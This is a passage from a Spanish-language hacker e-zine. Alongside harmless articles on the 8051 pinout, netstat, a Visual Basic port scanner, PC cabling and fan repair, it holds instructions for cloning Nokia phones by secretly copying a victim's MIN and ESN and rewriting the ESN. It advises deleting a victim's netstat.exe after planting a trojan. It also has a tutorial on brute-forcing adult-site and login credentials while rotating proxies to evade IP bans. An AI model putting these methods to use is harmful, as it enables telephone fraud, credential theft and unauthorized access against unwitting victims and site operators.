Descripción de las líneas (Pines) del 8051.

Acá te presento el microcontrolador 89C51/52:

(ver la micro89C52.bmp que se encuentra dentro del zip)


Descrición de las conexiones:

+----------------------------------------------------------------------------------------+
| Nemónico     | No. de Pin   |  Tipo    |    Función                                    |
|----------------------------------------------------------------------------------------|
|Vss           |  20          |  Ent.    | Tierra 0V                                     |
|              |              |          |                                               |
|P0.0-P0.7     |  32          |  E/S     | Puerto 0: Es un puerto biireccional con       |
|              |              |          | salidas en colector abierto. Cuando el        |
|              |              |          | puerto tiene 1's escrito, las salidas estan   |
|              |              |          | flotadasy pueden servir como entradas en alta |
|              |              |          | impedancia. El puerto 0 es también multi-     |
|              |              |          | plexado para obtener el DATO y la parte       |
|              |              |          | baja de la direccion.                         |
|              |              |          |                                               |
|P1.0-P1.7     |  1 al 8      |  E/S     | Puerto 2: Es un puerto quasibidireccional     |
|              |              |          | con fijadores de nivel internos (pull-up).    |
|              |              |          | Cuando se escriben 1's, las líneas pueden ser |
|              |              |          | utilizadas como entradas o salidas. Como en-  |
|              |              |          | tradas las líneas que son externamente        |
|              |              |          | colocadas en la posicion baja proporcionan    |
|              |              |          | una corriente hacia el exterior. El puerto 2  |
|              |              |          | es usado ademas para direccionar memoria      |
|              |              |          | externa. Este puerto, emite el byte mas alto  |
|              |              |          | de la direccion durante la busqueda en la     |
|              |              |          | memoria de programa externo y durante el      |
|              |              |          | acceso a memorias de datos externos que usan  |
|              |              |          | direccionamientos de 16 bits. Durante el      |
|              |              |          | acceso a memoria de dato externa, que usa     |
|              |              |          | direcciones de 8 bits, el Puerto 2 emite el   |
|              |              |          | contenido del registro correspondiente a este |
|              |              |          | puerto, que se encuentra en el espacio de     |
|              |              |          | funciones especiales.                         |
|              |              |          |                                               |
| P3.0-P3.7    |  10 al 17    |  E/S     | Puerto 3: Es un puerto quasi-bidireccional con|
|              |              |          | fijadores del nivel internos(pull-up). Cuando |
|              |              |          | se escriben 1's sobre el puerto, las lineas   |
|              |              |          | pueden ser utilizadas como entradas o salidas.|
|              |              |          | El puerto 3 se utiliza ademas para producir   |
|              |              |          | señales de control de dispositivos externos   |
|              |              |          | como los siguientes:                          |
|              |              |          |                                               |
|              |  10          |  Entrada | RXD(P3.0): Puerto serie de entrada.           |
|              |              |          |                                               |
|              |  11          |  Salida  | TXD(P3.1): Puerto serie de salida.            |
|              |              |          |                                               |
|              |  12          |  Entrada | INT0(P3.2): Interrupcion externa.             |
|              |              |          |                                               |
|              |  13          |  Entrada | INT1(P3.3): Interrupcion externa.             |
|              |              |          |                                               |
|              |  14          |  Entrada | T0(P3.4): Entrada externa Timer 0.            |
|              |              |          |                                               |
|              |  15          |  Entrada | T1(P3.5): Entrada externa Timer 1.            |
|              |              |          |                                               |
|              |  16          |  Salida  | WR(P3.6): Habilitados de escritura para       |
|              |              |          |           memoria externa de datos            |
|              |              |          |                                               |
|              |  17          |  Salida  | RD(P3.7): Habilitador de lectura  para la     |
|              |              |          |           memoria externa de datos.           |
|              |              |          |                                               |
| RST          |  9           |  Entrada | Reset: Una entrada alta en esta linea durante |
|              |              |          | dos ciclos de maquina mientras el oscilador   |
|              |              |          | esta corriendo detiene el dispositivo. Un     |
|              |              |          | resistor interno conectado a Vss permite un   |
|              |              |          | alto en la fuente usando solamente un         |
|              |              |          | capacitor externo a Vcc.                      |
|              |              |          |                                               |
| ALE          |  30          |  E/S     | Addre Latch Enable. Un pulso de salida permite|
|              |              |          | fijar el byte bajo de la direccion durante el |
|              |              |          | acceso a una memoria externa. En operacion    |
|              |              |          | normal, ALE es emitido en un rango constante  |
|              |              |          | de 1/6 de frecuencia del oscilador, y es      |
|              |              |          | emitido durante cada acceso a la memoria de   |
|              |              |          | datos externos.                               |
|              |              |          |                                               |
| PSEN         |  29          |  Salida  | Program Store Enable. Habilitar de lectura    |
|              |              |          | para memoria programas externos. Cuando 8051  |
|              |              |          | esta ejecutando un codigo de memoria de       |
|              |              |          | programas externos, PSEN es activada dos veces|
|              |              |          | cada ciclo de maquina, exepto cuando se       |
|              |              |          | accesa la memoria de datos externos o cuando  |
|              |              |          | se usa la memoria de programas internos.      |
|              |              |          |                                               |
| EA           |  31          |  Entrada | External Access. EA debe mantenerse           |
|              |              |          | externamente en posicion baja para habilitar  |
|              |              |          | el mecanismo que elige el codigo de           |
|              |              |          | localizaciones de la memoria de programas     |
|              |              |          | externos, 0000H y 0FFFH. Si EA se mantiene    |
|              |              |          | posicion alta, el dispositivo ejecuta los     |
|              |              |          | programas que se encuentran en la memoria     |
|              |              |          | interna ROM, a menos que el controlador del   |
|              |              |          | programa contenga una direccion mayor a 0FFFH.|
|              |              |          |                                               |
| XTAL1        |  19          |  Entrada | Cristal 1. En la entrada del cristal para el  |
|              |              |          | circuito oscilador (generador de reloj        |
|              |              |          | interno) que amplifica e invierte la entrada. |
|              |              |          |                                               |
| XTAL2        |  18          |  Salida  | Cristal 2. Es salida del amplificador         |
|              |              |          | oscilador inversor.                           |
|              |              |          |                                               |
+----------------------------------------------------------------------------------------+

Bueno amigos lectores, hasta aqui con controladores, hasta la proxima entrega cuando nos adentremos mas en materia de microcontroladores (programacion y teoria relevante).

PD. Todo el material ha sido recopilado y redacto de revistas, guias(apuntes de clase) y manuales durante mi estadia en la Universidad, en ningun momento pretendo suplantar libros o textos especializados, esto es un MATERIAL DE REFERENCIA para el disfrute de todos ;-)

<<Actinio89>>

++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

============================================================================================
[5]---------------------[ CLONACION DE CELULARES NOKIA 51xx/61xx ]-----------------------[5]
============================================================================================

                                       [ YeaYou ]

+--------------+
| Introducción |
+--------------+ 

Bueno escribo este texto por que es un tema que a mí en lo particular fue una de las primeras cosas que me llamo la atención y trate de hacerlo basándome en algunos textos que estaban un poco incompletos pero gracias a ellos y algunos otros mas me eh dado una idea para clonar un celular, todo lo que aquí expongo son cosas que e aprendido con el tiempo y al igual que todo ser humano puedo tener errores, pero bueno ahora si pasemos a lo que nos interesa.

+-----------+
| CLONACIÓN |
+-----------+

En este primer articulo de Clonación de celulares voy a explicarles como se clona un Nokia 51XX/61XX, en posteriores artículos manejaremos Motorola, Ericsson o algún otro pero bueno va la explicación de como hacerlo con los Nokia ya mencionados:


[1]Programación:
----------------

-Primero lo primero, prender el celular
-Luego marcar *#639#
-Nod pide un numero así que hay que ponerlo [este es el MIN que esta en el ESN]
-Luego nos pide el Sys ID [mas abajo pongo los SIDs de México]

Aquí están los SIDs de México:


24578                   Baja California Sur Baja California Norte
24594                   Sinaloa Sonora
24582                   Chihuahua Durango
24581                   Nuevo León Tamaulipas Coahuila
24586                   Jalisco Colima y Michoacán
24588                   Guanajuato  Aguas calientes Zacatecas Querétaro San Luis Potosí
24590                   Tlaxcala Guerrero Oaxaca Veracruz Puebla
24592                   Chiapas Tabasco Campeche Yucatán Quintana Roo 
24580                   DF  Edo de México  Morelos Hidalgo

Como verán no es muy difícil de programar un Nokia 51XX/61XX pero esto es lo mas fácil, para 
poder clonar un celular aparte de esto se le necesita cambiar el ESN del celular ya que cuando encendemos el celular este manda la señal a la centralita si los datos que tiene: ESN y MIN son correctos nos permitirá hacer una llamada o acceder al sistema de lo contrario cuando intentemos hacer algo va a sonar tuu... tuu... tuu... bueno y para poder cambiarle el ESN se necesitan dos cosas. 1. un cable para poder conectar el celular a la PC y 2. un programa para poder cambiarle el ESN.

Aquí les voy a poner los esquemas para construir un cable M2BUS para un celular 51/XX y 61XX


[2]Esquemas

Imagen: NokiaMbus.gif (contenido dentro de este zip)


[3]Software

Por ultimo hace falta el programa ahora aquí les va la dirección de donde esta el programa 
http://usuarios.lycos.es/forostmu/nokia.zip

Bueno el programa que les he puesto es el Easy IMEI v1.01 el cual es muy fácil de usar solo se necesita seleccionar el puerto [COM 1, COM 2, COM 3 o COM4], luego el modelo del celular [51XX o 61XX] luego el tipo de cable [FBUS, M2BUS o Auto Detect] por ultimo poner el nuevo ESN o IMEI y darle en Write to phone y listo el celular ahora si esta listo.



Bueno ahora por ultimo una breve explicación de lo que se debe de hacer, primero se necesita
tener toda la info del celular que se quiera clonar para esto basta con pedirle el celular 
a la victima con el pretexto de que quieres jugar tantito y sacarle la información necesaria, ahora ¿que información es la necesaria y como sacarla? 

1. La información necesaria es el MIN o numero de teléfono [NOTA: no es el que tu marcas para que no se te ocurra poner el que tu marcas]

2. Bueno para conseguir esta info se hace algo muy sencillo *3001#12345# y entraras otro menú aquí encontraras los NAMs y Serial No. que son los que nos interesan, vienen mas pero de nada nos sirven, ahora lo que hacemos es darle en el NAM 1 [que es el que normalmente se usa] y debe de mostrarte un numero de 10 dígitos, ese es el que debes apuntar luego te sales de ese menú y te vas a Serial No. que es el numero de serie de celular [Este es el ESN] ahora lo anotas y listo devuelves el celular [Por cierto que no te pase lo que a mí no dejes que nadie te vea lo que estas haciendo y si lo logras hacer no te pongas a presumir por ahí o te pueden ocurrir dos cosas una que se cachen y dos que nunca nadie te vuelva a prestar su celular].

Ya con los datos solo necesitamos que hacer lo que antes se había explicado programar el celular y cambiarle el ESN por los que sacamos.

Bueno espero que les sirva de algo este articulo, y les recuerdo que todos nos podemos equivocar.

Nota 1: Como todo mundo debe de saber Clonar celulares es ILEGAL y ni YeaYou ni el editor de 
NovaHack Zine ni ninguna otra persona mas que TU es responsable del mal uso que se haga con
este texto ya que se expone con fines educativos.

Nota 2: Para programar el celular [NOKIA 51/61XX] lo puedes hacer con la manera mencionada
*#639# y también se puede meter los datos directamente dando *3001#12345#, esto lo aclaro 
por si a uno se le hace mas fácil o mejor programarlo por ahí pues bien, da la misma.

++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

============================================================================================
[6]--------------------------------------[ NetStat ]-------------------------------------[6]
============================================================================================

                                          [ Daru ]


Ok, ya estan aqui todos para leerme, pues bien, en este articulo vamos a ver un comando del que absolutamente nadie puede precindir: NETSTAT.
En este mundillo ya sabes que no puedes confiar en nadie (o si?) por eso se le recomienda a todo el mundo que tenga un poco de paranoia y de no confiar en todo lo que se lee o se oye; por eso yo normalmente confio en 2 cosas: mi mente y el NetStat.

INTRO

El netstat es un comando "universal" osea, que lo vas a encontrar en casi cualquier plataforma desde unix hasta windows; porque? por que simplemente todo el mundo lo necesita; por que es un comando muy util. La funcion del netstat es muy simple, basta con traducir NetStat: Estado-de-la-Red. Bravo, adivinaste, netstat nos dice lo que esta pasando en nuestra red, absolutamente todo lo que nuestra computadora esta haciendo en la red en ese momento, con que otras computadoras hay comunicacion via red o internet, que puertos esta usando, que maquina lo esta escuchando, que maquinas esta escuchando nuestra pc, etc.


EL COMANDO
-nota: yo separo el comando del demas texto con una linea vertical como esta: | | | y a las letras o palabras que les tienes que poner tu un valor [variables] les pongo un signo de admiracion antes. ok? para que se vayan acostumbrando a como escribo.

Windows 95/98

Bajo estos windows invocar al netstat no es algo muy complicado o del otro mundo simplemente hay que iniciar una ventana de MS-DOS [Inicio > Programas > MS-DOS] y teclear |netstat| y si no estas conectados a internet magicamente nos aparecera algo como esto:

C:\WINDOWS>netstat

Conexiones activas

  Proto  Dirección local        Dirección remota       Estado

C:\WINDOWS>

Bravo, ya pudimos comandar un netstat :D. Como sospecharas, estas no son las unicas funciones del netstat, sino dirias -maldito daru, tanto  rollo para tan poquito. :D.
Al comando se le pueden agragar  varios y utlies argumentos [ese texto que va despues del comando] que nos seran de gran utilidad mas adelante, mientras apredetelos junto con su utilidad:

NETSTAT posibles argumentos > [-a] [-e] [-n] [-s] [-p proto] [-r] [!intervalo]

  -a            Muestra todas las conexiones y puertos los puertos que estan
                escuchando [estan abiertos jejeje]

  -e            Muestra estadísticas de la conexion Ethernet. Se puede combinar
                con el argumento -s.

  -n            Muestra números de puertos y direcciones en formato numérico
                [pone en la pantalla los puertos en forma de numeros [en ves
                de telnet pondria 23 o en ves de SMTP pondria 25] y las
                direcciones tambien; [en ves de ver el nombre del servidor como
                www.microsoft.com verias la direccion ip.

  -p !proto     Muestra conexiones del protocolo especificado por !proto; que
                puede ser tcp o udp. Si se usa con la opción -s para mostrar
                estadísticas por protocolo, proto puede ser TCP, UDP o IP.

  -r            Muestra el contenido de la tabla de rutas [muy interesante].

  -s            Muestra estadísticas por protocolo. En forma predeterminada, se
                muestran para TCP, UDP e IP; se puede utilizar la opción -p
                para especificar un subconjunto de lo predeterminado.

  !intervalo    Vuelve a mostrar las estadísticas seleccionadas, haciendo
                pausas en el intervalo de segundos especificado entre cada
                muestra. Presione Ctrl+C [como en linux :D] para detener la
                actualización de estadísticas. Si se omite, netstat imprimirá
                la actual información de configuración una vez.

Ok, eso es para windows 95 y 98 ahora que tal 2000 y xp, aprovecharemos que estan hechos con el kernel del NT para hacer cosas chidillas :D.

Windows 2000, ME y Xp

Ok, invocar al netstat en estos windows es mas facil de lo que parece  solo abres el "simbolo del sistema" [Inicio > Programas > Accesorios > Simblo del sistema] y tecleas |netstat|.
Ahora, hay algo muy inetresante de estos windows, en especial el xp y su netstat: el argumento -o. Este argumento nos dice nada mas y nada menos que el PID del programa que este usando el internet, osea, en una linea de eco aparece el estado de la conexion pero aparte aparece el PID [Proces ID o ID de proceso] y con el  numero de PID podemos ver que aplicacion es, simplemente hay que abrir el administrador de tareas, menu ver, click en "seleccionar columnas" y le das click en la casilla de verficacion que diga algo sobre el PID o que diga PID o algo asi, y ahora cambiamos a la pestaña de "procesos" y ya podemos que proceso tiene cada PID y asi poder saber que lo que esta haciendo en internet cada programa [muy, muy interesante no?].

Linux y otros sistemas operativos

Pues se la pelaron porque tenia un linux en mi PC pero mi hermano lo quito asi que se van a tener que conformar con teclear en una consola |netstat -?| , |man netstat| o |info netstat| para ustedes mismos obtener ayuda :D.

USOS INTERESANTES

Ok, ok, uds. diran: de que me sirve saber todo ese puto comando cuando no se le puede sacar algo util? pues mentira; aqui van algunos usos utiles, y ya sabes, nada con exceso, todo con medida, pero, a quien le importa?

>La ip de un wey por el msn messenger: haces que te reciba la transferencia de un archivo por la ventana de chat y cuando se este tranfiriendo el archivo le das |netstat -a| y por ahi debe de estar ya que como se esta haciendo una conexion completa tu tambien debes estar escuchandolo y por eso sale su ip, creo que tambien saldria sin el argumento -a y en el estado deberia de decir ESTABLESHIED o algo asi. Como lo mas probable es que tambien estes comunicado con otras maquinas [que estes viendo otras paginas de internet o que estes en alguna aplicacion p2p] te recomiendo que cierres todos los programas para que se cierren las conexiones y asi se te facilite identificar cual de todas es la ip del wey.

>temes por un troyano?: si temes por un troyano, nada mejor que |netstat -a| te dice que puertos estan a la escucha [estan abiertos] y si ves algun puerto raro como 3580 o uno que sabes que un troyano usa, pues lo mejor es actuar inmediatamente. matar el proceso. si estas en windows 95 o 98 l mas seguro es que el troyano se esconda del menu del Cntrl + Alt + Supr asi que lo mejor es actuar rapido con el mata procesos del darky que puedes bajar de mi pagina www.darux.cjb.net seccion software. y ya que lo hayas bajado [no esta muy grande] lo abres y ves los procesos y matas los que se vean sospechosos o que tienen un icono tenebroso. En windows 2000, ME o Xp ya sabes, miras el PID de proceso y lo matas. si el troyano cierra el administrador de tareas antes de que puedas matarlo, entras la carpeta system, o system32 y haces una copia del taskmgr.exe y abres esa copia para que el troyano piense que es otro programa pero fap! lo matas por la espalda.

>quitale la posobilidad de informarce: si el netstat te sirve para tanto, por que no cuando le cueles un troyano a la victima le borras su netstat.exe? lo puedes encontrar en la carpeta system o system32. Por eso tambien te recomiendo que te hagas una copia de seguridad de tus programas mas usados: telnet, ping, netstat, taskmgr, etc. que tambien puedes encontrar en la carpeta system o system32.

Ok gente, me despido de todos y ya saben si tienen alguna duda o comentario escribanme a daru_rules@hotmail.com , tambien nos les haria daño que visitaran mi pagina www.darux.cjb.net.

Saludos a todos - C.H.T. rulez !!!

++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++


============================================================================================
[7]----------------------------------[ Scanner en VB ]-----------------------------------[7]
============================================================================================

                                       [ N1ck_M4 ]

Explicacion de como crear un escaneador de puertos desde Visual Basic, el ejecutable y el codigo fuente se encuentran el fichero adjunto scanner.zip

Al escanear un puerto de nuestro equipo lo que hacemos es poner el
puerto en esqucha.
Si nos marca el erroro 10048 quiere decir que el puerto esta en uso
;)

-para hacer el fuente solo ocupas 3 cuadros de texto
text1
text2
text3

-un boton de comando
command1

-El control winsock
winsock1

-4 etiquetas
label1
label2
label3
label4

Debe tener mas o menos esta apariencia:

       Asi Se Ve                      Tipo de Objetos
----------------------------------------------------------

Puerto inicial   Puerto final     <------label1 y label2
 _______           _________
¦_______¦         ¦_________¦     <--------text1 y text2

         _________
        ¦ Iniciar ¦               <-------------Command1
         ---------+

   ___________________________
  ¦Escaneando:                ¦   <---------------Label3
   ---------------------------+


Puertos Abiertos:                 <---------------Label4
 ____________________________
¦                            ¦
¦                            ¦
¦                            ¦
¦                            ¦
¦                            ¦   <-----------------Text3
¦                            ¦
¦                            ¦
¦____________________________+


el siguiente codigo lo copias en declaraciones:

Private Sub Command1_Click()
On Error GoTo errors   'Al marcar el error de puerto en uso se va a
                       'esta parte para registrarlo
Dim num_Puerto As Long 'Variable que representa el puerto a escanear
num_Puerto = Text1     'se inicia la variable con el valor del text1
Do                     'ciclo para escanear los puertos del rango text1 a text2
   Winsock1.Close      'cerramos el ultimo puerto abierto.
   DoEvents            'Para que no se cuelgue la maquina
   Label3.Caption = "Escaneando:--->  " & num_Puerto  'en cual vamos
   Winsock1.LocalPort = num_Puerto                    'asignamos el numero de puerto
   DoEvents
   Winsock1.Listen                                    'y lo ponemos en escucha
                                                      'Aqui es donde se genera el error
                                                      'si el puerto esta en uso(se va a errors)
   DoEvents
   num_Puerto = num_Puerto + 1 'se incrementa el numero de puerto
Loop Until num_Puerto > Text2.Text  'se repite hasta el valor del text2
Exit sub   'aqui termina

errors:
    If Err.Number = 10048 Then  'si el purto esta en uso
        Text3 = Text3 & num_Puerto & vbCrLf 'lo mandamos al text3
        DoEvents
        Resume Next ' y continuamos con el siguiente puerto
    End If
End Sub


eso es todo

Un Saludo Desde Monterrey N.L.

By N1ck_M4


++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++


============================================================================================
[8]=================[ Conectar dos PC por el puerto paralelo o serial ]==================[8]
============================================================================================

                                         [ keogh ]


Esto es fácil de hacer solo hay que tener algunos conocimientos de como soldar circuitos y esas cosas.

¿Para que nos sirve esto? Pues bien por ejemplo un amigo tiene una laptop y quieres que te pase informacion, videos que se yo, a pos con este cablecito se comparten carpetas como si estuvieras en una red.

Ahora empecemos.

+------------+
| Materiales |
+------------+

- Dos conectores DB25 con tapa (en caso de que la conexión sea por el paralelo).
- Dos conectores DB9 con tapa (en caso de que la conexion sea por el serial).
- 2 mts o más de cable de 12 hilos (No blindado).
- Estaño.
- Soldador.
- Voltimetro (para checar resultados).


+------------------------+
| Diagrama de los Cables |
+------------------------+

Para el DB9 o cable serial, los cables debes de ir:

1 nada
2 --------> 3
3 --------> 2
4 --------> 6
5 --------> 5
6 --------> 4
7 --------> 8
8 --------> 7
9 nada

Para el DB25 o cable paralelo, los cables deben de ir como se muestra a continuación, además de esto le he dado a cada conexión el color de un cable para que no te pierdas ;-)

 1 Nada
 2 ------> 15 Blanco
 3 ------> 13 Cafe
 4 ------> 12 Azul con negro
 5 ------> 10 Verde
 6 ------> 11 Azul
 7 Nada
 8 Nada
 9 Nada
10 ------> 5 Naranja
11 ------> 6 Lila
12 ------> 4 Amarillo con negro
13 ------> 3 Negro
14 Nada
15 ------> 2 Amarillo
16 Nada
17 Nada
18 Nada
19 Nada
20 Nada
21 Nada
22 Nada
23 Nada
24 Nada
25 ------> 25 Gris


Despues de hacer las conexiones debidas, las comprobamos con el voltimetro.


+---------------------+
| Conectando las PC's |
+---------------------+

Ahora para hacer que las dos PC's se conecten voy a utilizar un programa que me da el win2, esto lo he probado en el win98 y en el ME, para los demas sistemas solo es cuestion de probar, ¿ok?

Nos vamos a INICIO--->Programas-->Accesorios-->Comunicaciones-->Conexion por cable

Aparece una pantalla que nos dice que si queremos ser host o invitado. Si le damos host entonces seremos la maquina que comparte archivos, si somos invitado seremos los que tomaremos lo que el host tiene compartido. O sea una de las PC's tiene que ser host y la otra invitado.

Ahora la que va a ser host, antes que nada se tiene que ir al explorador de windows y tiene que compartir los archivos que se deseen.

Despues de que se selecciona que si quien va a ser el host y quien el invitado, damos al boton siguiente. Nos pide por cual puerto va a ser la conexion, si hiciste el cable con el db25 entonces seleccionas LPT1, si no pues seleccionas el serial.

Despues se inicia la conexion entre las dos máquinas y woala, ya tienes una red entre dos maquinas ;-)

s4lu2.

++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

============================================================================================
[9]-----------------------------[ Repacion de Coolers ]----------------------------------[9]
============================================================================================

                                    [ ShiMMyShaKe ]


NOTA DEL EDITOR: En este texto se ocupan imagenes, pero como este formato no lo permite, las imagenes se han puesto en un zip llamado "coolerimages.zip", que viene adjunto con este fichero.


Hola estamos de regreso por aki explicare la reparacion de un fan cooler de los ke usan los procesadores (este tipo de reparaciones hacen ke vuelvana funcionar bien en la mayoria de los casos cuando presentan ruido) espero les sea de ayuda

Tenemos al fancooler  solo necesitas un desarmador pekeño para desarmarlo un un poco de aceite

Quitarle la etiqueta al fancooler
(col1.jpg)

al quitarle la etiqueta se encuentra un seguro
(col2.jpg)

quitar el seguro
(col3.jpg)
(col4.jpg)

separar el ventilador en dos partes las aspas y el campo (bobina)
(col5.jpg)

limpiar las partes con una brocha y luego aceitar (aceite de maquina de coser poner una gotita de cada lado) aqui:
(col6.jpg) 
(col7.jpg)

armar el ventilador de nuevo las dos partes y poner el seguro ponerle la etiketa y 
listo
(col8.jpg) 
          
                                                                                                               (¯`·._.·[ ShiMMyShaKe ]·._.·´¯)


++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++


============================================================================================
[10]------------[ Vulnerabilidad de los sistemas de seguridad por Icaruss ]-------------[10]
============================================================================================
                   
                                         [ Icaruss ]


Parte I : Características de Los tipos de Seguridad
------------------------------------------------------

En este tutorial se muestra como probar la seguridad en los sistemas de seguridad de red, este tutorial es informativo, no soy responsable en como se usen estos conocimientos.

Debido a que es muy difícil encontrar paginas en Internet con sistemas de seguridad ya que estas paginas no son abiertas a todos los usuarios, tendremos que enfocarnos en las paginas mas comunes que tienen sistemas de seguridad, las paginas para adultos, sin embargo lo que se aprenderá aquí puede ser usado con cualquier tipo de pagina que posea un sistema de seguridad.

Los tipos de seguridad más comunes son los siguientes:
  *Basic http Auth
  *HTML Form Based password
  *AVS password (este es basicamente igual al HTML Form Based)


El AVS password consta de una sola cadena, dentro de este tipo de passwords entran los AdultChecks, adult check Gold, Age check, etc..
Ejemplo:
ID : 1234Icaruss

El HTML Form based password esta basado en formas html, utiliza el método get o post para obtener dos cadenas de una forma html, una cadena es el username y la otra es el password, Este sistema de seguridad es el mas complejo de crackear.
Ejemplo :

Username : Marco
Password : ********

Este tipo de password es complejo por que no se conoce el destino o servidor donde se encuentra el guión que procesa la forma, además para crackear unos de estos passwords se necesita mucho tiempo ya que los ataques son muy lentos, sin embargo también voy a explicar como se crackean estos sitios :) .

El Basic http password consta de 2 cadenas un username y un password, se muestra mediante una ventana pop up, varia de el password basado en formas html en la manera que se procesan las variables
Ejemplo :

    ---------------------------------
    |             ________________  |
    |  Username: |                | |
    |             ----------------  |
    |             ________________  |
    |  Password: |                | |
    |             ----------------  |
    |                               |
    |_______________________________|




Volviendo a los AVS, estos poseen un servidor central lo cual los hace muy vulnerables por ejemplo el Adultcheck , su servidor central es http://www.adultcheck.com/ y todos los ID que estén en la base de datos de este servidor serán aceptados en cualquiera de las miles de paginas que tienen a Adultcheck como sistema de seguridad, para adquirir un adult check es necesario pagar una cantidad además de tener tarjeta de crédito para pagar, pero como a nosotros no nos gusta pagar :), vamos a crackear el sitio, esto de el servidor central nos hace todo mas fácil ya que solo tenemos que crackear un solo sitio y tendremos acceso a miles, bueno ahora si viene lo bueno, ¿Cómo le hago para crackear el sitio?, Que pasaría si empiezo a mandarle una y otra solicitud de autenticidad al servidor?, si le empiezo a mandar solicitudes como : hkdhhshsdk, hkhdhds, lklklk4oiu, jkskjsd, no pasaría nada, simplemente el servidor las descarta por no tener sentido (esto claro depende de el tipo de filtro que el
sitio tenga), el AC debe comenzar con 4 dígitos seguidos de 6 a 12 letras, ejemplo : 4563superman, 2347batman, entonces si manda una petición y luego otra y otra y todas tienen sentido, el servidor las analiza todas y compara cada ID con su base de datos, imagina esto, si compara 1 ID con toda su base de datos, que pasara si tiene que comparar 30000 IDs, simplemente no es posible para el servidor y tarde o temprano dejara pasar algunos IDs (Esto no es totalmente cierto sin enbargo es una idea para los newbies) , puedes conseguir
unos 50 ID por hora + o - en el AC normal , el servidor del AC gold tiene mas capacidades y es mucho mas difícil crackearlo así es que obtendrás unos 5 ID por hora , ya se lo que estas pensando ¿Cómo le hago para mandar esas solicitudes?, bueno solo necesitas un programa que se conecte a http://www.adultcheck.com/ y le mande solicitudes y como le manda solicitudes? Mediante los métodos http_accept , http_user y http_password , para hacer las conexiones debes dominar un lenguaje de programación y claro saber como programar para Internet, además debes saber HTML (si no sabes nada de esto no te preocupes por fortuna para ti ya existen
programas que puedes conseguir en Internet :) ) ; bueno pero los AVS no se van a dejar que les ganes tan fácil , así es que han desarrollado métodos para protegerse de los ataques, el mas importante es que detectan tu IP y si mandas alrededor de 5 a 10 solicitudes y estas son rechazadas el Server banea tu IP y descarta todas las solicitudes que le mandes sin importar que tengan o no sentido , se pone mas difícil , bueno entonces que es lo que tengo que hacer? , pues fácil atinarle en las primeras 5 solicitudes , :) es broma , bueno si el AVS no se va a dejar ganar nosotros tampoco , si el AVS me banea cada 5 solicitudes entonces cada 5 solicitudes cambio de IP :) , para cambiar de IP necesito proxys , un proxy es una dirección IP que actúa como intermediario en una conexión , para evitar que me banee puede cambiar de proxy cada 2 o 3 solicitudes y de esta manera casi ninguno de mis proxys será baneado , basta con 200 proxys para poder crackear algunos ID (100 o mas) , entonces ya sabemos que es lo que necesitamos : una lista con miles de IDs creados por ti , podría ser
1000marcos hasta 9999marcos y una lista con 200 proxys mínimo , estos no puedes crearlos tienen que ser verdaderos ya que ellos serán los que realicen las conexiones dejándote anónimo ya que tu IP no intervendrá y no podrán rastrearte, ahora tal vez digas aaaaaaaa tengo que teclear desde 1000marcos hasta 9999marcos de uno por uno?,que gueva , bueno la verdad no , existen herramientas para generar listas :), en todo pienso, después veremos como utilizar estas herramientas , con respecto a los proxys puedes conseguirlos en
Internet o con tu proveedor mas cercano (creo que soy yo) , Este tipo de ID (4 dígitos seguidos de 6 a 12 letras) solo sirve en los sistemas Adult Check Regular y Adult Check Gold, todos los AVS funcionan de manera similar lo único que varia es el tipo de ID y por lo tanto tienes que crear diferentes listas al final anexare todos los tipos de IDs. Bueno aquí se termina el AVS password :) .

Vamos a pasar a el Basic http password y dejemos el segundo tipo para el final .

Aquí es lo mismo solo que el tipo de ID es diferente, se requieren mas proxys, se requiere una lista con username y passwords ejemplo : marcos:cracker, los ":" separan el user y el password , este tipo de sistema es mas difícil que el AVS ya que no hay servidor central y es necesario crackear cada sitio , además hay sistemas muy variados, algunos tienen filtros de palabras otros de velocidad otros ambos y todos banean IPs pero varia la cantidad de solicitudes que puedes hacer , algunos banean el IP si la primera solicitud es rechazada esto es un problema ya que consumirá tus proxys rápidamente para este tipo de sistema necesitas una gran cantidad de proxys (mas de 1000) , pero son muy pocos la gran mayoría puede ser penetrada fácilmente, y otros pueden ser casi imposibles de crackear (sin embargo nada es imposible).

Este sistema de seguridad es una aplicación y puede procesar las peticiones desde la barra de direcciones de el explorador, un ejemplo de petición es la siguiente : http://marcos:cracker@members.somesite.com/ , esta es una petición para acceder a la pagina http://members.somesite.com/ con el ID user : marcos pass : cracker , así es que si deseas programar una aplicación deberá tomar el user y el pass de una lista y adherirlos a la dirección que deseas crackear y luego mandar las solicitudes ,puedes conseguir los programas en Internet los mas usados son : el Access Diver , Goleen Eye , Ares , PassCraft y Brutus , la mayoría de los sitios de calidad poseen este sistema de seguridad .

El HTML form based password debe ser crakeado al igual que el Basic Http password , para cada sitio , esto quiere decir que tampoco poseen un servidor central , en este tipo de sistema necesitas conocer la dirección de el guión que procesara la forma y la variable que identifica al username y al password , te preguntaras , ¿y como puedo saber eso? Pues algunas veces es fácil y otras veces es muy difícil , para conocer el guión que procesara la forma y la variables debes examinar el código fuente de la pagina que deseas crackear , encontraras una etiqueta llamada #FORM>dentro de esta etiqueta deberá estar lo siguiente:
#FORM action="somesite.com/login.cgi">somesite.com/login.cgi es la dirección de el guión que procesa la forma de igual manera deberás encontrar el nombre de lasvariables :

username : #INPUT type=text value= name=variableuser>
password : #INPUT type=password name=variablepassword>

Con estos tres datos puedes atacar un sitio protegido con HTML form based password , existen programas que analizan automáticamente las formas y obtienen estos 3 datos , sin embargo algunas paginas poseen trampas para ocultar el destino de la forma y el nombre de las variables , estas trampas suelen ser redirecciones , esto es que en el código fuente no se encuentra directamente la dirección de el guión que procesa la forma , en este caso deberás analizar minuciosamente el código fuente y encontrar el destino de la forma , puedes
encontrar los programas para crackear este tipo de password en Internet.

En la parte II aprenderemos a utilizar los programas para crackear estos tres
tipos de sistemas de seguridad.

icarusscrack@hotmail.com para Preguntas o Comentarios. (si alguna parte de este tutorial es confusa o no entienden algunos de los términos por favor envíenme un e-mail y yo les responderé tratando de explicar mas claramente las dudas que se tengan ).

++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

============================================================================================
[11]--------------------------[ Bugs y Como explotarlos ]-------------------------------[11]
